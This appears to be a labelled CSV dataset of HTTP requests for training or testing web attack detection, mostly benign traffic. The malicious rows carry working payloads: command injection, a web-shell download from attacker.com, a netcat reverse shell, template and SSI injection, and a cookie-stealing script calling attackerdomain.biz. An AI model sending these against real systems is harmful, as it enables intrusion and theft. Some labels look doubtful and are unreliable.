label,text
benign,"POST /api/log HTTP/1.1
Host: data-insights.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Type: application/json
Accept: application/json
Referer: https://dashboard.data-insights.ai/
Content-Length: 388

{""eventRecord"":{""type"":""user_feedback"",""details"":{""rating"":4,""comments"":""The dashboard loads quickly and UI is intuitive.""},""userInfo"":{""id"":""user8732"",""profile"":{""membership"":""gold"",""preferences"":{""newsletterOptIn"":true}}},""deviceContext"":{""os"":""macOS 13.2"",""browser"":""Chrome 113""}},""timestamp"":""2024-06-01T12:40:22Z""}"
benign,"GET /images/logo.svg HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: image/svg+xml
Via: 1.1 vegur
Connection: close"
benign,"GET /static/v2/css/theme-dark.css HTTP/1.1
Host: cloud-products-tech.net
Accept: text/css,*/*;q=0.1
Referer: https://dashboard.cloud-products-tech.net/app/home
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Connection: keep-alive"
benign,"GET /v1/orders HTTP/1.1
Host: quickcart-platform.org
Accept: application/json
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiJ9.eyJ1c2VyIjoiY2xpZW50MTIzIn0.YFHzXmHWE3mgY3TbO3xe1QIg82wMwcG54Dw_eV8LUfM
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept-Language: en-US,en;q=0.8
Cache-Control: no-cache
Connection: keep-alive"
benign,"GET /community/posts/latest HTTP/1.1
Host: community.game-dev-forum.org
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Cookie: forum_sid=a3d1f8907c123b550a; user_pref=darkmode; last_read_thread=1423
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.9"
benign,"GET /products;category=books;genre=history/top-sellers HTTP/1.1
Host: elite-book-store.net
User-Agent: curl/7.79.1
Accept: */*
Accept-Encoding: deflate, gzip
Connection: keep-alive"
malicious,"GET /diag/ping_host?target=8.8.8.8%3B%20cat%20/etc/passwd HTTP/1.1
Host: online-retail-management.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://dashboard.online-retail-management.biz/home
Connection: keep-alive"
benign,"OPTIONS /api/user/settings HTTP/1.1
Host: user-preferences.cloud-hosting.dev
Origin: https://settings.webmail-suite.com
Access-Control-Request-Method: GET
Access-Control-Request-Headers: X-CSRF-Token, Accept
User-Agent: curl/7.83.1
Accept: */*
Connection: close"
malicious,"GET /login?redirect=%2Fhome%3Fsession%3Dactive%250d%250aSet-Cookie%3A%20isAdmin%3Dtrue%3B%20HttpOnly%3B%20Secure HTTP/1.1
Host: user-access-portal.co.uk
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://user-access-portal.co.uk/login
Cache-Control: max-age=0"
benign,"GET /assets/styles/theme.min.css HTTP/1.1
Host: online-retail-empire.biz
Connection: keep-alive
Accept: text/css,*/*;q=0.1
Referer: https://online-retail-empire.biz/products/electronics
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept-Encoding: br, gzip, deflate
Accept-Language: en-GB,en;q=0.8"
benign,"GET /images/logo.svg HTTP/1.1
Host: news-media-outlet.ai
Accept: image/svg+xml,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36
Referer: https://news-media-outlet.ai/home
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"POST /ws/weatherupdate HTTP/1.1
Host: api.weather-station-network.us
Content-Type: application/soap+xml; charset=utf-8
Content-Length: 233
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept-Language: en-us
Connection: keep-alive

<?xml version=""1.0"" encoding=""utf-8""?>
<soap12:Envelope xmlns:soap12=""http://www.w3.org/2003/05/soap-envelope"">
  <soap12:Body>
    <UpdateWeatherStation xmlns=""http://weather-station-network.us/ws"">
      <StationID>WS-4732</StationID>
      <Temperature unit=""C"">21.5</Temperature>
      <Humidity>58</Humidity>
    </UpdateWeatherStation>
  </soap12:Body>
</soap12:Envelope>"
malicious,"POST /app/user/settings HTTP/1.1
Host: user-authentication-portal.tv
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://user-authentication-portal.tv/app/user/profile
Content-Length: 111
Connection: close

comment=Your+platform+is+intuitive.+%3C%3Fphp+echo+shell_exec%28%27wget+http%3A%2F%2Fattacker.com%2Fshell.php+-O+%2Ftmp%2Fsh.php%27%29%3B+%3F%3E"
benign,"GET /archive/2023/05/updates HTTP/1.1
Host: online-retail-store.biz:4500
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Referer: https://online-retail-store.biz/"
malicious,"GET /reports/annual HTTP/1.1
Host: finance-data-streams.net
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Referer: http://finance-data-streams.net/secure/reports{# {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('netstat%20-an').read() }} #}
Cache-Control: no-cache"
benign,"GET /dashboard/overview?cmd=view_details HTTP/1.1
Host: analytics-suite.cloud-center.io
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Referer: https://analytics-suite.cloud-center.io/dashboard/home
Upgrade-Insecure-Requests: 1"
malicious,"POST /api/v1/logentry HTTP/1.1
Host: exfiltrator.network-monitoring.cloud
Content-Type: application/json
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept-Encoding: gzip, deflate
Content-Length: 283
Connection: close

{""client_ip"": ""10.0.0.1"", ""event_details"": ""Access granted\"", \""auth_code\"": 200, \""username\"": \""superuser\"", \""access_level\"": true, \""meta\"": \""Auth success logged""}"
malicious,"POST /profile/update HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: curl/7.77.0
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://community.game-dev-forum.org
Content-Length: 66

bio=New%20gamer%20profile%20info%20%3C!--#inCLude%20FiLe%3D%22/etc/issue%22%20--%3E"
benign,"POST /register/newaccount HTTP/1.1
Host: bright-ideas-tech.co
User-Agent: curl/7.88.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 97
Origin: https://bright-ideas-tech.co
Referer: https://bright-ideas-tech.co/register
Connection: close
Cookie: user_session=bbf8ab2cc954365e7e8a7a5e0e8dd66d

username=techthinker&email=tech.thinker%40bright-ideas-tech.co&password=Bright2024!&password_confirm=Bright2024!&terms_accepted=true"
malicious,"POST /api/update_profile HTTP/1.1
Host: data-insights-platform.tech
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: application/xml, text/xml, */*
Content-Type: text/plain
Content-Length: 90
Cookie: di_token=def456xyz123abc789token
Connection: close

user%5Bemail%5D=analyst%40data-platform.tech&user%5Bis_analyst%5D=1&user%5Bprofile%5D%5Bverified%5D=true"
malicious,"POST /newsletter/subscribe HTTP/1.1
Host: marketing-content-network.ai
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Content-Type: application/x-www-form-urlencoded
Referer: https://exclusive.partner-newsletter.info/welcome
Content-Length: 27
Cookie: sessid=a47cde1087c53f23cd8a58266e9f4122

email=engageduser%40mailservice.dev"
benign,"PATCH /api/articles/45712 HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer a3sdjklas9d8f7wery12
Content-Type: application/merge-patch+json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0
Accept: application/json
Connection: keep-alive
Content-Length: 44
Referer: https://my-personal-blog-site.info/admin/dashboard

{""title"":""Updated guide to sustainable gardening""}"
benign,"GET /device/control?cmd=status_check HTTP/1.1
Host: iot-control-center.tech
User-Agent: curl/7.88.1
Accept: */*
DNT: 1
Connection: keep-alive"
benign,"PUT /api/v2/users/9321 HTTP/1.1
Host: api.secure-user-portal.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.aBcDeFgHi12345.jKlMnOpQrStUvWxYz
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive
Content-Length: 143

{""id"":9321,""username"":""marc_jackson"",""email"":""marc.jackson@securemail.net"",""role"":""admin"",""active"":true,""preferences"":{""notifications"":true,""theme"":""dark""}}"
benign,"POST /signup/newsletter HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Referer: https://community.game-dev-forum.org/forums/announcements
Connection: keep-alive

email=josephine.smith%40gamedevforum.org"
malicious,"POST /api/user/redirect HTTP/1.1
Host: mobile-secure-login.com
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36
Accept: application/json
Accept-Language: en-US,en;q=0.8
Content-Type: application/json
Content-Length: 58

{""continue_to"": ""https://ads.attacker-net.info/promo""}"
benign,"GET /favicon.ico HTTP/1.1
Host: online-book-club.net
Connection: keep-alive
Accept: image/x-icon,image/vnd.microsoft.icon,*/*;q=0.9
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:113.0) Gecko/20100101 Firefox/113.0
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7"
benign,"DELETE /data/v1/sessions/982e5c HTTP/1.1
Host: api.identity-verification-service.net
Authorization: Bearer SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
X-Confirm-Delete: true
User-Agent: python-requests/2.28.1
Accept: application/json
Cache-Control: no-cache
Connection: close"
benign,"GET /travel/destinations/europe/france/paris HTTP/1.1
Host: wanderlust-worldwide.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr-FR,fr;q=0.9,en;q=0.8
Referer: https://culinary-journeys.org/recipes/desserts
Connection: keep-alive
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
benign,"GET /gallery/photos/2023/07?session_id=uvw987rst&ref=summer_campaign HTTP/1.1
Host: creative-vision-studio.co
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.7
Referer: https://creative-vision-studio.co/
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36"
benign,"POST /account/security/notifications HTTP/1.1
Host: financial-dashboard-app.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Content-Length: 117
DNT: 1
Cookie: financeSess=842a9f23065cdd3c23a2af8d4bfe3ce1

{""notificationEmails"":[""security-alerts@financial-dashboard-app.co"",""it-support@financial-dashboard-app.co""],""enabled"":true}"
benign,"GET /user/profile/settings?utm_medium=referral&utm_source=partner_site HTTP/1.1
Host: secure-user-portal.net
Accept: text/html
Accept-Language: en-US,en;q=0.9
Referer: https://partnerlogin.secure-user-portal.net/welcome
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Connection: close"
benign,"POST /auth/request-reset HTTP/1.1
Host: digital-assets-cloud-platform.io
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
X-Requested-With: XMLHttpRequest
Content-Length: 58
Connection: keep-alive

{""email"":""lara.mitchell@digital-assets-cloud-platform.io""}"
malicious,"POST /v2/input/check HTTP/1.1
Host: api.pattern-guard.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Content-Type: application/json
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: br, gzip, deflate
Accept-Language: en-GB,en;q=0.9
Referer: https://dashboard.pattern-guard.ai/app/
Origin: https://dashboard.pattern-guard.ai
Cache-Control: max-age=0
Pragma: no-cache
X-Requested-With: XMLHttpRequest
Sec-CH-UA: ""Chromium"";v=""90"", "" Not A;Brand"";v=""99"", ""Google Chrome"";v=""90""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""macOS""
Content-Length: 188

{""complex_pattern_input"": ""abababababababababababababababababababababababababababababababababababX""}"
benign,"GET /product/organic-cotton-tshirt-forest-green HTTP/1.1
Host: eco-fashion-market.org
Connection: close
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Referer: https://eco-fashion-market.org/collections/tshirts
Cookie: cart_id=5c0e83b2f3d9a; session_token=5b9a7cf7-4e54-4d92-b4a6-efa73e52dc57
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
benign,"POST /submission/form HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
User-Agent: curl/7.87.0
Accept: */*
Connection: close
X-Forwarded-For: 198.51.100.23

updates[]=daily&updates[]=weekly&preferred_contact=email"
benign,"HEAD /downloads/official/updates/bigsoft_v10_patch.exe HTTP/1.1
Host: update-server-cloud.biz
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
benign,"PUT /api/devices/1809 HTTP/1.1
Host: iot-management-platform.cloud
Authorization: Bearer token_67go89lkh3nkjdh7fvd9823jf
Content-Type: application/json
Accept: application/json
User-Agent: Python-urllib/3.11
Connection: close
Content-Length: 140

{""deviceId"":1809,""name"":""Weather Sensor Alpha"",""location"":""Greenhouse 5"",""status"":""active"",""metrics"":{""temperature"":24.3,""humidity"":39}}"
malicious,"POST /api/executeTask HTTP/1.1
Host: centralized-control-panel.biz
Content-Type: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json
Accept-Encoding: gzip, deflate
Content-Length: 130

{""job_id"":76543,""target_host"":""local-db.internal || nc -e /bin/sh attacker-cmdshell-dev.hk 4444"",""execute_as"":""admin""}"
malicious,"POST /portal/search/items HTTP/1.1
Host: news-aggregator-service.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/xml,application/xhtml+xml,text/html;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/xml
Content-Length: 127
Cache-Control: max-age=0

<searchRequest>
  <term>' or count(//node()) > 0 or ''='</term>
  <category>news</category>
</searchRequest>"
benign,"POST /feedback/send HTTP/1.1
Host: techhelpdesk.supporthub.co
Content-Type: application/x-www-form-urlencoded
Content-Length: 115
Referer: https://techhelpdesk.supporthub.co/feedback
Origin: https://techhelpdesk.supporthub.co
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.100 Safari/537.36
Cookie: session_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
Connection: keep-alive

name=Javier+Martinez&email=javier.martinez%40supporthub.co&subject=Feature+Request&message=Could+you+add+a+dark+mode+option+to+the+dashboard+interface%3F+Thanks."
malicious,"POST /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Content-Length: 210
Connection: keep-alive
X-Requested-With: XMLHttpRequest

payload_b64=TzozMToiUnVzdEV4cGVyaWVuY2VcQmFjcGVidWdpIjoyOntzOjY6ImtleSI7czoyMzoic2V0dGluZ3MiO3M6MTI6InByb2ZpbGVfaWQiO2k6NDI7fQ=="
malicious,"POST /app/submit-url HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 58
Origin: https://dashboard.secure-user-portal.net
Connection: keep-alive

{""callbackUrl"":""http://0x7F000001:3000/api/status?verbose=true""}"
benign,"HEAD /api/v1/status/health HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Python-urllib/3.11
Accept: application/json
Connection: close
X-Forwarded-For: 192.0.2.45"
benign,"GET /api/v1/notifications?unread_only=true HTTP/1.1
Host: mobile-sync-service.devopscloud.tech
Accept: application/json
App-Secret: da98f5ec154a42eb8a3fdf4e0d6ca1f5
User-Agent: curl/7.88.1
Connection: close"
malicious,"GET /forum/thread/987654321 HTTP/1.1
Host: internal-api.gateway.local
User-Agent: Python-urllib/3.9
Accept: application/json
X-Requested-With: XMLHttpRequest
Cache-Control: max-age=0"
benign,"GET /rss_atom_feed HTTP/1.1
Host: my-personal-blog-site.info
Accept: application/rss+xml, application/xml
User-Agent: curl/7.85.0
Referer: https://my-personal-blog-site.info/articles
DNT: 1
Connection: close"
benign,"GET /api/v3/items/search?filter=active&limit=15&page=2&callback=processData HTTP/1.1
Host: api.cloud-data-services.ai
Accept: application/javascript, application/json, text/plain, */*;q=0.01
Connection: keep-alive
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7"
benign,"POST /api/projects HTTP/1.1
Host: cloud-innovations-data.io
Authorization: Bearer eyJ0aWQiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsZXhJLiBTbWl0aCIsImlhdCI6MTY4NzQxMjAwMCwiZXhwIjoxNjg3NDEyNjAwfQ==
Content-Type: application/json
Accept: application/json
User-Agent: python-requests/2.28.1
Content-Length: 95
Connection: keep-alive

{""name"":""Automated Data Backup"",""description"":""Project to implement daily automated backups to cloud storage."",""deadline"":""2024-10-10""}"
benign,"POST /api/signup HTTP/1.1
Host: greenfield-crafts.co.uk
Content-Type: application/json
Accept: application/json
Origin: https://greenfield-crafts.co.uk
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0
Content-Length: 144
Connection: keep-alive

{""user"":{""username"":""tomas.wilkes"",""email"":""tomas.wilkes@greenfield-crafts.co.uk"",""password"":""Craft2024!"",""preferences"":{""newsletter"":false,""notifications"":true}}}"
benign,"GET /app/user/settings?token=thj5KwAhVmbKl4zlXvkVVIv3SDl2IoRdZmc1RLzpw2XMnYduFCAatnb6HsG7eJs8pFqUwQDXyOeZBTnJLvZYpHMsNYCgjRXLtKUcArOHVw9kqED37MPf0ibSlToGyxvy HTTP/1.1
Host: my-personal-blog-site.info
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Mobile Safari/537.36
Connection: keep-alive
Referer: https://my-personal-blog-site.info/dashboard
DNT: 1"
benign,"GET /news/latest-updates HTTP/1.1
Host: daily-trendz.media
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
Referer: https://daily-trendz.media/
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1"
benign,"POST /users/signup HTTP/1.1
Host: globaltech-consortium.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 113
Origin: https://globaltech-consortium.io
Referer: https://globaltech-consortium.io/users/signup
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Cookie: consent=yes; tracking_id=ba76f3c091e2f
Connection: keep-alive

username=natalie_ross&email=natalie.ross%40globaltech-consortium.io&password=GTechRocks!99&password_confirm=GTechRocks!99&terms_accepted=true"
benign,"GET /games/strategy/classic-war HTTP/1.1
Host: pixel-battlegrounds.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1"
benign,"GET /category/technology/latest-trends HTTP/1.1
Host: insight-tech-journal.ai
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: https://insight-tech-journal.ai/
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
benign,"POST /votes/poll/552 HTTP/1.1
Host: civic-engage.org
User-Agent: curl/7.79.1
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 21
Connection: keep-alive

poll_id=552&choice_id=12"
malicious,"POST /track/log HTTP/1.1
Host: app-beacon-service.cloud
User-Agent: Python-urllib/3.9
Content-Type: application/json
Accept-Encoding: gzip
Content-Length: 258
Connection: keep-alive

{""token"":""T3872kfhe"", ""event_details"":""Button click registered\"", \""status_code\"": 200, \""user_id\"": \""admin\"", \""is_privileged\"": true, \""original_event\"": \""btn_click""}"
malicious,"GET /content/welcome.shtml?user_greeting=Hi%20there<!--#EXEC%20cmd=""id""--> HTTP/1.1
Host: legacy-portal-services.net
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"POST /password/reset HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Connection: close
Accept: text/html,application/xhtml+xml
Accept-Language: en-GB,en;q=0.9
Origin: https://api.cloud-data-services.ai
DNT: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15

email=martin.bradshaw%40cloudmail.ai"
benign,"POST /checkout/cart/add-item HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 98
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Origin: https://online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Mobile Safari/537.36
Referer: https://online-retail-store.biz/products/electronics/tv/details

product_id=TV%23456%20X%26Y&quantity=2&coupon_code=SAVE%25OFF&special_note=Please%20wrap%20as%20gift%20%26%20include%20receipt"
malicious,"POST /api/v2/user/profile/update HTTP/1.1
Host: user-access-control.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/json
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjozOH0.A5l3KjXKmNtjX-0uN0vLxUcq5DaTX8-GoA9SIwpKtsA
Content-Length: 261
Cache-Control: no-cache
Origin: https://login.user-access-control.net

{
  ""username"": ""harriet89"",
  ""profile_url"": ""/dashboard/%0d%0aSet-Cookie:%20malicious=stealdata;HttpOnly%0d%0a%0d%0a<script>fetch('http://attackerdomain.biz/log?cookie='+document.cookie)</script>"",
  ""redirect_url"": ""/app/home""
}"
benign,"DELETE /api/v1/resources/43 HTTP/1.1
Host: data-archive-portal.co.uk
Authorization: Bearer d12f3a5b7e8016c1bf4a3f8d441d2a32f4fde97e
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: application/json
Accept-Language: en-GB,en;q=0.7
Connection: keep-alive
Via: 1.1 varnish"
